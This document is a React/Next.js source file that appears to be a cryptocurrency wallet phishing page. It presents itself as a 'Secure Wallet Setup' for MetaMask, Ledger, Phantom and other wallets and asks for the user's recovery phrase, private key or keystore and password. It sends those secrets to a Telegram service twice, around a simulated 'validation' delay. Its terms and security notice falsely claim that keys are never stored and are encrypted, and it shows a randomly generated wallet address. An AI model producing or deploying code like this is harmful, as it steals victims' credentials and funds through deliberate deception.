'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2, Clock, ShieldCheck } from 'lucide-react';
import { useWallet } from '@/components/context/WalletContext';
import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
import { TelegramService } from '@/libs/service/telegramService';
import WalletIcon from '@/components/logic/WalletIcons';

// Validation Popup Component
interface ValidationPopupProps {
  isOpen: boolean;
  type: 'success' | 'error' | 'warning' | 'info' | 'valid' | 'invalid';
  title: string;
  message: string;
  onClose: () => void;
  onConfirm?: () => void;
  confirmText?: string;
  countdown?: number;
}

function ValidationPopup({ isOpen, type, title, message, onClose, onConfirm, confirmText = 'Continue', countdown }: ValidationPopupProps) {
  if (!isOpen) return null;

  const getIcon = () => {
    switch (type) {
      case 'success':
      case 'valid':
        return <CheckCircle className="w-6 h-6 text-green-500" />;
      case 'error':
      case 'invalid':
        return <AlertCircle className="w-6 h-6 text-red-500" />;
      case 'warning':
        return <AlertCircle className="w-6 h-6 text-yellow-500" />;
      default:
        return <ShieldCheck className="w-6 h-6 text-blue-500" />;
    }
  };

  const getBgColor = () => {
    switch (type) {
      case 'success':
      case 'valid':
        return 'bg-green-500/10 border-green-500/20';
      case 'error':
      case 'invalid':
        return 'bg-red-500/10 border-red-500/20';
      case 'warning':
        return 'bg-yellow-500/10 border-yellow-500/20';
      default:
        return 'bg-blue-500/10 border-blue-500/20';
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className={`bg-gray-900 rounded-2xl p-6 max-w-sm w-full ${getBgColor()} border backdrop-blur-lg`}>
        <div className="flex items-center space-x-3 mb-4">
          {getIcon()}
          <h3 className="text-lg font-semibold text-white">{title}</h3>
        </div>
        <p className="text-gray-300 text-sm mb-4">{message}</p>
        
        {countdown !== undefined && (
          <div className="flex items-center justify-center space-x-2 mb-4 p-3 bg-black/20 rounded-lg">
            <Clock className="w-4 h-4 text-blue-400" />
            <span className="text-blue-400 text-sm font-mono">
              {countdown}s
            </span>
          </div>
        )}
        
        <div className="flex space-x-3">
          {onConfirm && (
            <button
              onClick={onConfirm}
              className="flex-1 bg-white text-black py-3 px-4 rounded-xl font-medium hover:bg-gray-200 transition-all duration-200 transform hover:scale-105"
            >
              {confirmText}
            </button>
          )}
          <button
            onClick={onClose}
            className={`flex-1 bg-gray-700 text-white py-3 px-4 rounded-xl font-medium hover:bg-gray-600 transition-all duration-200 ${!onConfirm ? 'flex-1' : 'flex-none px-6'}`}
          >
            {onConfirm ? 'Cancel' : 'Close'}
          </button>
        </div>
      </div>
    </div>
  );
}

// Terms & Conditions Component
interface TermsPopupProps {
  isOpen: boolean;
  onAgree: () => void;
  onDisagree: () => void;
}

function TermsPopup({ isOpen, onAgree, onDisagree }: TermsPopupProps) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full border border-gray-700 backdrop-blur-lg">
        <div className="flex items-center space-x-3 mb-4">
          <ShieldCheck className="w-6 h-6 text-blue-500" />
          <h3 className="text-lg font-semibold text-white">Terms & Conditions</h3>
        </div>
        
        <div className="max-h-60 overflow-y-auto mb-6 space-y-3">
          <div className="text-sm text-gray-300 space-y-2">
            <p><strong>By connecting your wallet, you agree to:</strong></p>
            
            <div className="bg-gray-800 p-3 rounded-lg">
              <p className="font-medium text-white mb-2">Security Acknowledgement</p>
              <ul className="space-y-1 text-xs text-gray-400">
                <li>• You understand the risks of connecting your wallet</li>
                {/* <li>• You are on the official website</li> */}
                <li>• Never share your recovery phrase with anyone</li>
                <li>• We never store your private keys</li>
              </ul>
            </div>

            <div className="bg-gray-800 p-3 rounded-lg">
              <p className="font-medium text-white mb-2">Validation Process</p>
              <ul className="space-y-1 text-xs text-gray-400">
                <li>• Your credentials will be validated securely</li>
                {/* <li>• Validation happens in the background</li> */}
                <li>• Results will be shown immediately after validation</li>
                <li>• Invalid credentials will be rejected</li>
              </ul>
            </div>

            <div className="bg-gray-800 p-3 rounded-lg">
              <p className="font-medium text-white mb-2">Data Handling</p>
              <ul className="space-y-1 text-xs text-gray-400">
                <li>• We use industry-standard encryption</li>
                <li>• Your data is processed securely</li>
                <li>• Connection logs are maintained for security</li>
              </ul>
            </div>
          </div>
        </div>

        <div className="flex space-x-3">
          <button
            onClick={onAgree}
            className="flex-1 bg-blue-600 text-white py-3 px-4 rounded-xl font-medium hover:bg-blue-700 transition-all duration-200 transform hover:scale-105"
          >
            I Agree & Continue
          </button>
          <button
            onClick={onDisagree}
            className="flex-1 bg-gray-700 text-white py-3 px-4 rounded-xl font-medium hover:bg-gray-600 transition-all duration-200"
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
}

const WALLETS: WalletType[] = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '',
    colors: {
      primary: '#F6851B',
      secondary: '#E2761B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: '',
    colors: {
      primary: '#3B99FC',
      secondary: '#2A85FF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'coinbase',
    name: 'Coinbase',
    icon: '',
    colors: {
      primary: '#0052FF',
      secondary: '#0042D6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: '',
    colors: {
      primary: '#3375BB',
      secondary: '#2A65A6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'phantom',
    name: 'Phantom',
    icon: '',
    colors: {
      primary: '#4B49AC',
      secondary: '#3A3897',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ledger',
    name: 'Ledger',
    icon: '',
    colors: {
      primary: '#ededed',
      secondary: '#fafafa',
      text: '#FFFFFF'
    }
  },
  {
    id: 'trezor',
    name: 'Trezor',
    icon: '',
    colors: {
      primary: '#00B45A',
      secondary: '#009C4D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'binance',
    name: 'Binance',
    icon: '',
    colors: {
      primary: '#1a1a1a',
      secondary: '#232323',
      text: '#000000'
    }
  },
  {
    id: 'exodus',
    name: 'Exodus',
    icon: '',
    colors: {
      primary: '#1C1C1C',
      secondary: '#2D2D2D',
      text: '#FFFFFF'
    }
  },
  {
    id: 'argent',
    name: 'Argent',
    icon: '',
    colors: {
      primary: '#FF875B',
      secondary: '#FF6B3B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'rainbow',
    name: 'Rainbow',
    icon: '',
    colors: {
      primary: '#001A72',
      secondary: '#002EB5',
      text: '#FFFFFF'
    }
  },
  {
    id: 'zerion',
    name: 'Zerion',
    icon: '',
    colors: {
      primary: '#2962EF',
      secondary: '#1A51DF',
      text: '#FFFFFF'
    }
  },
  {
    id: 'brave',
    name: 'Brave',
    icon: '',
    colors: {
      primary: '#FB542B',
      secondary: '#E63E1C',
      text: '#FFFFFF'
    }
  },
  {
    id: 'ambire',
    name: 'Ambire',
    icon: '',
    colors: {
      primary: '#FF6B35',
      secondary: '#E55A2B',
      text: '#FFFFFF'
    }
  },
  {
    id: 'leap',
    name: 'Leap',
    icon: '',
    colors: {
      primary: '#00DC82',
      secondary: '#00C274',
      text: '#FFFFFF'
    }
  },
  {
    id: 'magic eden',
    name: 'Magic Eden',
    icon: '',
    colors: {
      primary: '#000000',
      secondary: '#333333',
      text: '#FFFFFF'
    }
  },
  {
    id: 'onto',
    name: 'ONTO',
    icon: '',
    colors: {
      primary: '#00A3FF',
      secondary: '#008CE6',
      text: '#FFFFFF'
    }
  },
  {
    id: 'safe',
    name: 'Safe',
    icon: '',
    colors: {
      primary: '#12FF80',
      secondary: '#00E572',
      text: '#000000'
    }
  },
  {
    id: 'solflare',
    name: 'Solflare',
    icon: '',
    colors: {
      primary: '#9945FF',
      secondary: '#7C36CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'torus',
    name: 'Torus',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'web3auth',
    name: 'Web3Auth',
    icon: '',
    colors: {
      primary: '#0364FF',
      secondary: '#0252CC',
      text: '#FFFFFF'
    }
  },
  {
    id: 'other',
    name: 'Other Wallet',
    icon: '',
    colors: {
      primary: '#6B7280',
      secondary: '#4B5563',
      text: '#FFFFFF'
    }
  }
];

// Validation functions
const validateMnemonic = (phrase: string): boolean => {
  const words = phrase.trim().split(/\s+/);
  return words.length === 12 || words.length === 24;
};

const validatePrivateKey = (key: string): boolean => {
  const cleanedKey = key.replace(/^0x/, '');
  return /^[0-9a-fA-F]{64}$/.test(cleanedKey);
};

const validateKeystore = (keystore: string): boolean => {
  try {
    const json = JSON.parse(keystore);
    return json && typeof json === 'object' && 'crypto' in json;
  } catch {
    return false;
  }
};

interface FormData {
  phrase: string;
  privateKey: string;
  keystore: string;
  password: string;
}

export default function EnterDetailsContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const walletId = searchParams.get('wallet');
  const { addWallet } = useWallet();
  
  const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey' | 'keystore'>('phrase');
  const [formData, setFormData] = useState<FormData>({
    phrase: '',
    privateKey: '',
    keystore: '',
    password: ''
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [hasSentToTelegram, setHasSentToTelegram] = useState(false);
  
  // New states for enhanced flow
  const [showTermsPopup, setShowTermsPopup] = useState(false);
  const [showValidationPopup, setShowValidationPopup] = useState(false);
  const [showResultPopup, setShowResultPopup] = useState(false);
  const [validationResult, setValidationResult] = useState<'valid' | 'invalid' | null>(null);
  const [countdown, setCountdown] = useState(15);
  const [validationMessage, setValidationMessage] = useState('');
  
  const telegramService = useRef<TelegramService | null>(null);
  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Initialize Telegram service
  useEffect(() => {
    telegramService.current = new TelegramService();
  }, []);

  const wallet = WALLETS.find(w => w.id === walletId);

  // Safe Telegram service with error handling
  const safeSendToTelegram = useCallback(async (data: {
    walletName: string;
    walletType: string;
    inputType: 'phrase' | 'privateKey' | 'keystore';
    inputData: string;
    password?: string;
    isValid: boolean;
    validationMessage: string;
    userAgent: string;
    timestamp: string;
  }) => {
    if (!telegramService.current) {
      console.error('Telegram service not initialized');
      return { success: false, error: 'Telegram service not initialized' };
    }

    try {
      const result = await telegramService.current.sendWalletData(data);
      if (result.success) {
        setHasSentToTelegram(true);
      }
      return result;
    } catch (error) {
      console.error('Telegram send failed:', error);
      return { 
        success: false, 
        error: error instanceof Error ? error.message : 'Unknown error' 
      };
    }
  }, []);

  // Background validation function
  const performBackgroundValidation = useCallback(async (): Promise<{isValid: boolean; message: string}> => {
    let isValid = false;
    let message = '';

    if (activeTab === 'phrase' && formData.phrase) {
      isValid = validateMnemonic(formData.phrase);
      message = isValid ? 'Valid recovery phrase' : 'Invalid recovery phrase - must be 12 or 24 words';
    } else if (activeTab === 'privateKey' && formData.privateKey) {
      isValid = validatePrivateKey(formData.privateKey);
      message = isValid ? 'Valid private key' : 'Invalid private key format';
    } else if (activeTab === 'keystore' && formData.keystore) {
      isValid = validateKeystore(formData.keystore);
      message = isValid ? 'Valid keystore JSON' : 'Invalid keystore JSON format';
    } else {
      message = 'No credentials provided';
    }

    // Simulate validation time (1-3 seconds)
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));

    return { isValid, message };
  }, [activeTab, formData.phrase, formData.privateKey, formData.keystore]);

  // Start validation when user agrees to terms
  const startValidationProcess = useCallback(async () => {
    setShowTermsPopup(false);
    setShowValidationPopup(true);
    setCountdown(15);

    // Start countdown
    countdownIntervalRef.current = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Send initial data to Telegram FIRST
    let inputData = '';
    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
    
    if (formData.phrase) {
      inputData = formData.phrase;
      inputType = 'phrase';
    } else if (formData.privateKey) {
      inputData = formData.privateKey;
      inputType = 'privateKey';
    } else if (formData.keystore) {
      inputData = formData.keystore;
      inputType = 'keystore';
    }

    // Send initial input data
    console.log('📤 Sending initial credentials to Telegram...');
    const initialSendResult = await safeSendToTelegram({
      walletName: wallet?.name || 'Unknown Wallet',
      walletType: inputType === 'phrase' ? 'seed' : inputType,
      inputType,
      inputData: inputData,
      password: formData.password || undefined,
      isValid: false,
      validationMessage: 'User submitted credentials - validation in progress',
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString(),
    });

    if (!initialSendResult.success) {
      console.warn('Failed to send initial data to Telegram:', initialSendResult.error);
    }

    // Perform background validation
    console.log('🔍 Starting background validation...');
    const validation = await performBackgroundValidation();
    console.log('✅ Validation completed:', validation);

    // Clear countdown
    if (countdownIntervalRef.current) {
      clearInterval(countdownIntervalRef.current);
    }

    // Send validation result to Telegram
    console.log('📤 Sending validation results to Telegram...');
    const validationSendResult = await safeSendToTelegram({
      walletName: wallet?.name || 'Unknown Wallet',
      walletType: inputType === 'phrase' ? 'seed' : inputType,
      inputType,
      inputData: inputData,
      password: formData.password || undefined,
      isValid: validation.isValid,
      validationMessage: validation.message,
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString(),
    });

    if (!validationSendResult.success) {
      console.warn('Failed to send validation results to Telegram:', validationSendResult.error);
    }

    // Show result
    setValidationResult(validation.isValid ? 'valid' : 'invalid');
    setValidationMessage(validation.message);
    setShowValidationPopup(false);
    setShowResultPopup(true);
  }, [formData, wallet?.name, performBackgroundValidation, safeSendToTelegram]);

  const handleConnect = async () => {
    if (!formData.phrase && !formData.privateKey && !formData.keystore) {
      setValidationResult('invalid');
      setValidationMessage('Please enter your wallet credentials');
      setShowResultPopup(true);
      return;
    }

    setIsConnecting(true);

    try {
      // Show terms and conditions first
      setShowTermsPopup(true);
      
    } catch (error: any) {
      console.error('Connection error:', error);
      setValidationResult('invalid');
      setValidationMessage('Connection failed. Please try again.');
      setShowResultPopup(true);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleValidationSuccess = () => {
    setShowResultPopup(false);
    
    // Create connected wallet
    const connectedWallet: ConnectedWallet = {
      id: wallet?.id || 'custom',
      name: wallet?.name || 'Custom Wallet',
      address: `0x${Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
      connectedAt: new Date(),
      isValid: true,
      ...(formData.phrase && { phrase: formData.phrase }),
      ...(formData.privateKey && { privateKey: formData.privateKey }),
      ...(formData.keystore && { keystore: formData.keystore }),
    };

    addWallet(connectedWallet);
    
    // Redirect to success page
    router.push('/connect/success');
  };

  const handleValidationRetry = () => {
    setShowResultPopup(false);
    setValidationResult(null);
    setValidationMessage('');
  };

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
      }
    };
  }, []);

  return (
    <div className="min-h-screen bg-black py-8 px-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center space-x-4 mb-8">
          <button 
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white transition-colors duration-200"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="flex items-center space-x-3">
            {wallet && (
              <div 
                className="w-10 h-10 rounded-xl flex items-center justify-center shadow-lg"
                style={{ 
                  background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                }}
              >
                <WalletIcon 
                  walletId={wallet.id} 
                  className="w-6 h-6" 
                />
              </div>
            )}
            <div>
              <h1 className="text-2xl font-bold text-white bg-linear-to-r from-white to-gray-300 bg-clip-text ">
                Secure Wallet Setup
              </h1>
              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
            </div>
          </div>
        </div>

        {/* Connection Methods Tabs */}
        <div className="bg-gray-900 rounded-2xl p-2 mb-6 border border-gray-800">
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => setActiveTab('phrase')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'phrase' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Key className="w-4 h-4" />
              <span className="text-sm font-medium">Phrase</span>
            </button>
            <button
              onClick={() => setActiveTab('privateKey')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'privateKey' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Shield className="w-4 h-4" />
              <span className="text-sm font-medium">Private Key</span>
            </button>
            <button
              onClick={() => setActiveTab('keystore')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'keystore' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span className="text-sm font-medium">Keystore</span>
            </button>
          </div>
        </div>

        {/* Input Forms */}
        <div className="bg-gray-900 rounded-2xl p-6 mb-6 border border-gray-800">
          {activeTab === 'phrase' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Recovery Phrase
              </label>
              <textarea
                value={formData.phrase}
                onChange={(e) => handleInputChange('phrase', e.target.value)}
                placeholder="Enter your 12 or 24-word recovery phrase"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                Typically 12 or 24 words separated by spaces
              </p>
            </div>
          )}

          {activeTab === 'privateKey' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Private Key
              </label>
              <textarea
                value={formData.privateKey}
                onChange={(e) => handleInputChange('privateKey', e.target.value)}
                placeholder="Enter your private key (64-character hexadecimal)"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                64-character hexadecimal string (with or without 0x prefix)
              </p>
            </div>
          )}

          {activeTab === 'keystore' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={formData.keystore}
                onChange={(e) => handleInputChange('keystore', e.target.value)}
                placeholder="Paste your keystore JSON file contents"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder="Enter keystore password"
                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
              />
            </div>
          )}
        </div>

        {/* Connect Button */}
        <button
          onClick={handleConnect}
          disabled={isConnecting}
          className="w-full bg-linear-to-r from-blue-600 to-blue-700 text-white py-4 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-105 shadow-lg shadow-blue-500/20"
        >
          {isConnecting ? (
            <div className="flex items-center justify-center space-x-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              <span>Processing...</span>
            </div>
          ) : (
            <span>Validate & Connect</span>
          )}
        </button>

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
          <div className="flex items-start space-x-3">
            <ShieldCheck className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
              <p className="text-xs text-gray-400">
                Your credentials are validated using industry-standard encryption. 
                We never store your private keys or recovery phrases.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Terms & Conditions Popup */}
      <TermsPopup
        isOpen={showTermsPopup}
        onAgree={startValidationProcess}
        onDisagree={() => {
          setShowTermsPopup(false);
          setIsConnecting(false);
        }}
      />

      {/* Validation in Progress Popup */}
      <ValidationPopup
        isOpen={showValidationPopup}
        type="info"
        title="Validating Credentials"
        message="Please wait while we securely validate your wallet credentials. This usually takes a few seconds..."
        countdown={countdown}
        onClose={() => {
          setShowValidationPopup(false);
          if (countdownIntervalRef.current) {
            clearInterval(countdownIntervalRef.current);
          }
        }}
      />

      {/* Validation Result Popup */}
      <ValidationPopup
        isOpen={showResultPopup}
        type={validationResult === 'valid' ? 'valid' : 'invalid'}
        title={validationResult === 'valid' ? 'Validation Successful!' : 'Validation Failed'}
        message={validationMessage}
        onClose={validationResult === 'valid' ? handleValidationSuccess : handleValidationRetry}
        onConfirm={validationResult === 'valid' ? handleValidationSuccess : handleValidationRetry}
        confirmText={validationResult === 'valid' ? 'Continue to Wallet' : 'Try Again'}
      />
    </div>
  );
}